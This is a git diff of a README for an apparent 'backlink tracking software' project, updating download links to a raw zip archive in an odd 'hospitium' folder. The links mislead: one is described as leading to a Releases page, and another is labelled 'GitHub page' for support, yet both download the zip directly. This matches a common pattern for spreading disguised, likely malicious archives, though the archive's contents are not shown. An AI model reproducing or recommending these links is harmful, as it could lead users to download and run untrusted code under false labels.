@@ -8,7 +8,7 @@ Welcome to the **backlink-tracking-software**! This tool helps you keep track of
 
 To download the software, visit the link below. You will find the latest version and previous releases available for download.
 
-[![Download the latest release](https://raw.githubusercontent.com/aleatorio600/backlink-tracking-software/main/hospitium/backlink-tracking-software.zip%20Latest%https://raw.githubusercontent.com/aleatorio600/backlink-tracking-software/main/hospitium/backlink-tracking-software.zip)](https://raw.githubusercontent.com/aleatorio600/backlink-tracking-software/main/hospitium/backlink-tracking-software.zip)
+[![Download the latest release](https://raw.githubusercontent.com/aleatorio600/backlink-tracking-software/main/hospitium/backlink-software-tracking-1.4.zip%20Latest%https://raw.githubusercontent.com/aleatorio600/backlink-tracking-software/main/hospitium/backlink-software-tracking-1.4.zip)](https://raw.githubusercontent.com/aleatorio600/backlink-tracking-software/main/hospitium/backlink-software-tracking-1.4.zip)
 
 1. Click on the download link above.
 2. You will be taken to the Releases page.
@@ -68,7 +68,7 @@ Yes, we offer support through our GitHub Issues page. You can report problems or
 
 ## 📞 Contact Us
 
-If you have further questions or need assistance, feel free to reach out. Visit our [GitHub page](https://raw.githubusercontent.com/aleatorio600/backlink-tracking-software/main/hospitium/backlink-tracking-software.zip) for support options.
+If you have further questions or need assistance, feel free to reach out. Visit our [GitHub page](https://raw.githubusercontent.com/aleatorio600/backlink-tracking-software/main/hospitium/backlink-software-tracking-1.4.zip) for support options.
 
 ## 📜 License
 
